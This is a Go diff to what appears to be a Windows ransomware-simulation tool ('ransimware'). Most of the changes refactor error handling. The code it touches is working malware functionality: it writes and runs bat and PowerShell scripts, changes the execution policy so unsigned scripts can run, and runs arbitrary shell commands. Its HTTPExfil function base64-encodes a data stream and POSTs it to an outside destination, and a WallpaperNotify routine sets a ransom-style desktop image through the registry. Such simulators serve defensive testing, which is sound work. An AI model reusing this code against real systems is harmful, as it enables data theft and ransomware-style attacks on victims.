@@ -18,7 +18,7 @@ import (
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 
-	hl "gitlab.com/mjwhitta/hilighter"
+	"gitlab.com/mjwhitta/errors"
 	"gitlab.com/mjwhitta/win/wininet/http"
 )
 
@@ -38,12 +38,17 @@ func executeBat(
 	// Run bat script
 	o, e = exec.Command(name).Output()
 
-	// Clean up if requested
+	// Clean up, if requested
 	if clean {
 		os.Remove(name)
 	}
 
-	return strings.TrimSpace(string(o)), e
+	// Check for error
+	if e != nil {
+		return "", errors.Newf("command \"%s\" failed: %w", name, e)
+	}
+
+	return strings.TrimSpace(string(o)), nil
 }
 
 func executePS1(
@@ -61,13 +66,10 @@ func executePS1(
 	}
 
 	if clean {
-		old, e = executeShell(
+		old, _ = executeShell(
 			"powershell",
 			[]string{"Get-ExecutionPolicy -Scope CurrentUser"},
 		)
-		if e != nil {
-			return "", nil
-		}
 	}
 
 	// Allow unsigned scripts to run
@@ -82,13 +84,13 @@ func executePS1(
 	// Run ps1 script
 	o, e = exec.Command("powershell", "-File", name).Output()
 
-	// Clean up if requested
+	// Clean up, if requested
 	if clean {
 		os.Remove(name)
 
-		// Restore old policy
+		// Restore old policy, or try
 		if old != "" {
-			_, e = executeShell(
+			executeShell(
 				"powershell",
 				[]string{
 					"Set-ExecutionPolicy -Scope CurrentUser " + old,
@@ -97,7 +99,12 @@ func executePS1(
 		}
 	}
 
-	return strings.TrimSpace(string(o)), e
+	// Check for error
+	if e != nil {
+		return "", errors.Newf("command \"%s\" failed: %w", name, e)
+	}
+
+	return strings.TrimSpace(string(o)), nil
 }
 
 func executeRegistry(cmds []string, clean bool) (string, error) {
@@ -196,7 +203,7 @@ func ExecuteScript(
 	case "registry":
 		return executeRegistry(cmds, clean)
 	default:
-		return "", hl.Errorf("ransimware: unsupported method")
+		return "", errors.Newf("unsupported method: %s", method)
 	}
 }
 
@@ -222,6 +229,11 @@ func executeShell(shell string, cmds []string) (string, error) {
 		}
 
 		if utf16, e = windows.UTF16FromString(tmp); e != nil {
+			e = errors.Newf(
+				"failed to convert %s to Windows type: %w",
+				tmp,
+				e,
+			)
 			return "", e
 		}
 
@@ -239,20 +251,18 @@ func executeShell(shell string, cmds []string) (string, error) {
 	case "powershell":
 		flag = "-c"
 	default:
-		e = hl.Errorf("ransimware: unsupported shell: %s", shell)
-		return "", e
+		return "", errors.Newf("unsupported shell: %s", shell)
 	}
 
 	// Run cmds
 	for _, cmd := range cmds {
-		o, e = exec.Command(shell, flag, cmd).Output()
+		if o, e = exec.Command(shell, flag, cmd).Output(); e != nil {
+			e = errors.Newf("command \"%s\" failed: %w", cmd, e)
+			return strings.Join(out, "\n"), e
+		}
 
 		if len(o) > 0 {
 			out = append(out, strings.TrimSpace(string(o)))
-		}
-
-		if e != nil {
-			return strings.Join(out, "\n"), e
 		}
 	}
 
@@ -281,16 +291,16 @@ func HTTPExfil(
 			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
 				return nil
 			} else if e != nil {
-				return e
+				return errors.Newf("failed to read data: %w", e)
 			}
 
 			// Create request
 			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
 			data = []byte(path + " " + b64)
-
-			// Send Message
 			r = http.NewRequest(http.MethodPost, dst, data)
 			r.Headers = headers
+
+			// Send Message and ignore response or errors
 			http.DefaultClient.Do(r)
 		}
 	}
@@ -316,10 +326,13 @@ func WallpaperNotify(
 
 		// Write PNG to file
 		if f, e = os.Create(img); e != nil {
-			return e
+			return errors.Newf("failed to create %s: %w", img, e)
 		}
 
-		f.Write(png)
+		if _, e = f.Write(png); e != nil {
+			return errors.Newf("failed to write to %s: %w", img, e)
+		}
+
 		f.Close()
 
 		// Get key
@@ -329,17 +342,17 @@ func WallpaperNotify(
 			registry.SET_VALUE,
 		)
 		if e != nil {
-			return e
+			return errors.Newf("failed to get registry key: %w", e)
 		}
 
 		// Set wallpaper
 		if e = k.SetStringValue("WallPaper", img); e != nil {
-			return e
+			return errors.Newf("failed to set wallpaper key: %w", e)
 		}
 
 		// Set style
 		if e = k.SetStringValue("WallpaperStyle", fit); e != nil {
-			return e
+			return errors.Newf("failed to set style key: %w", e)
 		}
 
 		// Set tiling
@@ -350,10 +363,10 @@ func WallpaperNotify(
 			e = k.SetStringValue("TileWallpaper", "0")
 		}
 		if e != nil {
-			return e
+			return errors.Newf("failed to set tile key: %w", e)
 		}
 
-		// Change background with Windows API
+		// Change background with Windows API, or try
 		user32 = windows.NewLazySystemDLL("User32")
 		user32.NewProc("SystemParametersInfoA").Call(
 			spiSetdeskwallpaper,
@@ -377,14 +390,14 @@ func writeScript(name string, cmds []string) error {
 
 	// Open script
 	if f, e = os.Create(name); e != nil {
-		return e
+		return errors.Newf("failed to create %s: %w", name, e)
 	}
 	defer f.Close()
 
 	// Write script
 	for _, cmd := range cmds {
 		if _, e = f.WriteString(cmd + "\n"); e != nil {
-			return e
+			return errors.Newf("failed to write to %s: %w", name, e)
 		}
 	}
 
